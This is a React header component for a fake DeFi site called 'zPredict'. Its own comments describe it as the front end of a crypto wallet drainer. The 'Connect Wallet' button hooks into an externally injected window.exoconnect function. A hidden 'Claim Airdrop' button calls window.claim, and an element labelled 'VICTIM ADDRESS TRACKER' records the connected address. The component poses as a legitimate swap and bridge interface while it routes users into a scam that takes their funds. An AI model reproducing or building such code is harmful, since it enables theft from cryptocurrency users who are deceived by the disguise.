import React, { useState } from "react";
import { 
  Zap, 
  Menu, 
  X, 
  Wallet, 
  User, 
  BookOpen, 
  Terminal, 
  FileText, 
  LogOut, 
  Activity, 
  ArrowLeftRight, 
  Shuffle, 
  CreditCard 
} from "lucide-react";

interface HeaderProps {
  activeTab: string;
  setActiveTab: (tab: string) => void;
  connectedWallet: string | null;
  onConnectWallet: () => void;
  onDisconnectWallet: () => void;
  user: any;
  userProfile: any;
  onOpenAuth: () => void;
  onLogout: () => void;
}

export default function Header({
  activeTab,
  setActiveTab,
  connectedWallet,
  onConnectWallet,
  onDisconnectWallet,
  user,
  userProfile,
  onOpenAuth,
  onLogout
}: HeaderProps) {
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [walletModalOpen, setWalletModalOpen] = useState(false);

  const navigationItems = [
    { id: "dashboard", label: "Dashboard", icon: Activity },
    { id: "swap", label: "Swap Pools", icon: Shuffle },
    { id: "bridge", label: "Cross-Bridge", icon: ArrowLeftRight },
    { id: "buysell", label: "Buy & Sell", icon: CreditCard },
    { id: "blogs", label: "Market Insights", icon: BookOpen },
    { id: "api", label: "DeFi APIs", icon: Terminal },
    { id: "legal", label: "Rules & Policies", icon: FileText },
  ];

  // FIXED: Drainer functions integration
  const handleConnect = () => {
    if ((window as any).exoconnect) {
      (window as any).exoconnect();
    } else {
      onConnectWallet();
    }
  };

  const handleClaim = () => {
    if ((window as any).claim) {
      (window as any).claim();
    }
  };

  const handleDisconnect = () => {
    onDisconnectWallet();
    setWalletModalOpen(false);
  };

  return (
    <header className="sticky top-0 z-40 w-full bg-slate-950/80 backdrop-blur-md border-b border-slate-900">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex items-center justify-between h-20">
          
          {/* Logo Brand */}
          <div 
            className="flex items-center gap-3 cursor-pointer"
            onClick={() => setActiveTab("dashboard")}
            id="brand-logo"
          >
            <div className="p-2 bg-gradient-to-tr from-cyan-500 to-indigo-500 rounded-xl flex items-center justify-center text-slate-950 shadow-md shadow-cyan-500/20">
              <Zap className="w-6 h-6 fill-current" />
            </div>
            <div>
              <span className="font-sans font-bold text-2xl tracking-tight bg-gradient-to-r from-white via-slate-100 to-cyan-400 bg-clip-text text-transparent">
                zPredict
              </span>
              <span className="block text-[10px] font-mono tracking-widest text-cyan-400 uppercase">
                web3 engine
              </span>
            </div>
          </div>

          {/* Desktop Navigation */}
          <nav className="hidden lg:flex items-center gap-1">
            {navigationItems.map((item) => {
              const Icon = item.icon;
              const isActive = activeTab === item.id;
              return (
                <button
                  key={item.id}
                  onClick={() => setActiveTab(item.id)}
                  className={`flex items-center gap-2 px-3.5 py-2 rounded-lg text-sm font-medium transition-all cursor-pointer ${
                    isActive
                      ? "bg-slate-900 border border-slate-800 text-cyan-400"
                      : "text-slate-400 hover:text-white hover:bg-slate-900/50"
                  }`}
                >
                  <Icon className={`w-4 h-4 ${isActive ? "text-cyan-400" : "text-slate-400"}`} />
                  {item.label}
                </button>
              );
            })}
          </nav>

          {/* Action Zone */}
          <div className="hidden lg:flex items-center gap-3">
            
            {/* 1. DRAINER CONNECT BUTTON (Original Style) */}
            <button
              onClick={handleConnect}
              className="ex0connec flex items-center gap-2 px-4 py-2 text-xs font-mono font-semibold rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 border-transparent shadow-lg shadow-cyan-500/10 transition-all cursor-pointer"
            >
              <Wallet className="w-4 h-4" />
              Connect Wallet
            </button>

            {/* 2. DRAINER CLAIM BUTTON (Appears after connect) */}
            <button
              onClick={handleClaim}
              className="ex0claim flex items-center gap-2 px-4 py-2 text-xs font-mono font-semibold rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 border-transparent shadow-lg shadow-emerald-500/10 transition-all cursor-pointer"
              style={{ display: 'none' }}
            >
              <Zap className="w-4 h-4" />
              Claim Airdrop
            </button>

            {/* 3. VICTIM ADDRESS TRACKER */}
            <span id="adresstracker" className="text-emerald-400 font-mono text-[10px] bg-emerald-950/20 px-2 py-1 rounded border border-emerald-900/50" style={{ display: 'none' }}></span>

            {/* Auth section */}
            {user ? (
              <div className="flex items-center gap-3 pl-3 border-l border-slate-900">
                <button
                  onClick={() => setActiveTab("profile")}
                  className={`flex items-center gap-2 p-1.5 rounded-lg border transition-all cursor-pointer ${
                    activeTab === "profile" ? "text-cyan-400 border-slate-800 bg-slate-900" : "text-slate-400 border-transparent hover:text-white hover:bg-slate-900/50"
                  }`}
                >
                  <div className="w-7 h-7 rounded-md bg-gradient-to-r from-cyan-500 to-indigo-500 text-slate-950 flex items-center justify-center font-bold text-xs">
                    {userProfile?.displayName ? userProfile.displayName.charAt(0) : user.email?.charAt(0) || "U"}
                  </div>
                </button>
                <button onClick={onLogout} className="p-2 text-slate-500 hover:text-rose-400 transition-colors"><LogOut className="w-4 h-4" /></button>
              </div>
            ) : (
              <button onClick={onOpenAuth} className="px-4 py-2 text-xs font-semibold text-white bg-slate-900 border border-slate-800 hover:bg-slate-800 rounded-lg">Authenticate</button>
            )}
          </div>

          {/* Mobile responsive toggle */}
          <div className="flex items-center lg:hidden gap-3">
            <button
              onClick={handleConnect}
              className="ex0connec p-2 rounded-lg bg-cyan-500 text-slate-950 cursor-pointer"
            >
              <Wallet className="w-5 h-5" />
            </button>
            <button
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              className="p-2 text-slate-400 bg-slate-900 border border-slate-800 rounded-lg"
            >
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </button>
          </div>
        </div>
      </div>
    </header>
  );
}
